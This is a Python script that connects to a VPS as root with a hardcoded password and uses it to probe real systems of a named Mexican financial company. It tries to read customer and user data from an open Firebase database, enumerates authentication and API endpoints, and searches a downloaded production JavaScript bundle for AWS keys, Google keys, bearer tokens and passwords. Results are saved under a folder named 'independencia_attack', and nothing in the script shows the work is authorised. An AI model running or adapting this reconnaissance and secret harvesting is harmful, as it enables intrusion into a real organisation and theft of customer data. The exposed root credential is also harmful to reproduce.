#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - SIF deep dive: Firebase, tysonprod, JS bundle analysis"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. Test Firebase DB (sif-cliente-unico.firebaseio.com)
    print("\n[*] === Firebase DB test ===")
    firebase_urls = [
        "https://sif-cliente-unico.firebaseio.com/.json",
        "https://sif-cliente-unico.firebaseio.com/users.json",
        "https://sif-cliente-unico.firebaseio.com/clientes.json",
        "https://sif-cliente-unico.firebaseio.com/config.json",
        "https://sif-cliente-unico.firebaseio.com/.json?format=export",
        "https://sif-cliente-unico.firebaseio.com/.json?shallow=true",
    ]
    firebase_results = {}
    for url in firebase_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/fb.json -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        print(f"  {url}: {out.strip()}")
        body, _ = ssh_exec(client, "head -c 2000 /tmp/fb.json", timeout=10)
        firebase_results[url] = {"response": out.strip(), "body": body[:2000]}
    log["firebase_results"] = firebase_results

    # 2. Test tysonprod auth endpoint
    print("\n[*] === Tysonprod auth endpoint ===")
    tyson_urls = [
        "https://findep-google-auth-mf.stable.tysonprod.com/auth/user-info/22416938-c389-11ed-afa1-0242ac120002",
        "https://findep-google-auth-mf.stable.tysonprod.com/auth/user-info",
        "https://findep-google-auth-mf.stable.tysonprod.com/",
        "https://findep-google-auth-mf.stable.tysonprod.com/auth",
        "https://findep-google-auth-mf.stable.tysonprod.com/auth/login",
        "https://findep-google-auth-mf.stable.tysonprod.com/.well-known/openid-configuration",
        "https://findep-google-auth-mf.stable.tysonprod.com/health",
        "https://findep-google-auth-mf.stable.tysonprod.com/api",
        "https://findep-google-auth-mf.stable.tysonprod.com/swagger",
        "https://findep-google-auth-mf.stable.tysonprod.com/docs",
    ]
    tyson_results = {}
    for url in tyson_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/ts.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, "head -c 2000 /tmp/ts.html", timeout=10)
        tyson_results[url] = {"response": out.strip(), "body": body[:2000]}
        if "HTTP:404" not in out and "HTTP:000" not in out:
            print(f"  {url}: {out.strip()}")
            safe_print(body[:500])
    log["tyson_results"] = tyson_results

    # 3. Test pao.findep.com.mx (MagicRobot)
    print("\n[*] === pao.findep.com.mx (MRcgi) ===")
    pao_urls = [
        "http://pao.findep.com.mx/MRcgi/MRentrancePage.pl",
        "http://pao.findep.com.mx/",
        "http://pao.findep.com.mx/MRcgi/",
        "https://pao.findep.com.mx/",
    ]
    pao_results = {}
    for url in pao_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/pao.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}} REDIR:%{{redirect_url}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, "head -c 3000 /tmp/pao.html", timeout=10)
        pao_results[url] = {"response": out.strip(), "body": body[:2000]}
        print(f"  {url}: {out.strip()}")
        if body:
            safe_print(body[:1000])
    log["pao_results"] = pao_results

    # 4. Deeper analysis of SIF JS bundle
    print("\n[*] === SIF JS bundle deep analysis ===")
    # Download app.js again
    cmd = (f"curl -sk -m 30 'https://sif.findep.mx/assets/app.js?c8844ce2f160c06a45be' -o /tmp/sif_app.js; wc -c /tmp/sif_app.js")
    out, _ = ssh_exec(client, cmd, timeout=35)
    print(f"  app.js: {out.strip()}")

    # Search for more endpoints, secrets, config
    patterns = {
        "endpoints": r"""['"`](/(?:api|v1|v2|auth|login|user|sif|teacher|course|student|payment|spei|graphql|admin|config|upload|download|file|report)[^'"`]{0,80})['"`]""",
        "urls": r"""['"`](https?://[a-z0-9.-]+\.[a-z]{2,}[^\s'"`]{0,200})['"`]""",
        "emails": r"""[\w.+-]+@[\w.-]+\.\w+""",
        "tokens": r"""(?:token|key|secret|password|pwd|auth|bearer|jwt)[\s:=]+['"`]([A-Za-z0-9+/=_-]{8,80})['"`]""",
        "uuids": r"""[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}""",
        "firebase": r"""[\w-]+\.firebaseio\.com""",
        "aws": r"""AKIA[0-9A-Z]{16}""",
        "google_keys": r"""AIza[0-9A-Za-z_-]{35}""",
        "bearer": r"""Bearer\s+[A-Za-z0-9._-]+""",
    }
    js_findings = {}
    for name, pat in patterns.items():
        cmd = f"grep -oE '{pat}' /tmp/sif_app.js | sort -u | head -50"
        out, _ = ssh_exec(client, cmd, timeout=30)
        findings = [l.strip() for l in out.strip().split("\n") if l.strip()]
        js_findings[name] = findings
        print(f"\n  {name}: {len(findings)} found")
        for f in findings[:15]:
            print(f"    {f}")
    log["js_findings"] = js_findings

    # 5. Test SIF API endpoints discovered
    print("\n[*] === Test SIF API endpoints ===")
    sif_endpoints = [
        "/api/auth/login", "/api/login", "/api/users", "/api/me", "/api/profile",
        "/api/teachers", "/api/students", "/api/courses", "/api/classes",
        "/api/payments", "/api/spei", "/api/transactions",
        "/api/config", "/api/settings", "/api/version",
        "/auth/login", "/auth/me", "/users/me", "/me",
        "/api/v1/auth/login", "/api/v1/users", "/api/v1/me",
    ]
    sif_probe = {}
    for ep in sif_endpoints:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /tmp/sif_ep.json -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' 'https://sif.findep.mx{ep}'")
        out, _ = ssh_exec(client, cmd, timeout=15)
        sif_probe[ep] = out.strip()
        if "HTTP:404" not in out and "HTTP:000" not in out:
            body, _ = ssh_exec(client, "head -c 1000 /tmp/sif_ep.json", timeout=10)
            print(f"  {ep}: {out.strip()}")
            if body:
                safe_print(f"    body: {body[:300]}")
    log["sif_api_probe"] = sif_probe

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_sif_deep.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] SIF deep saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
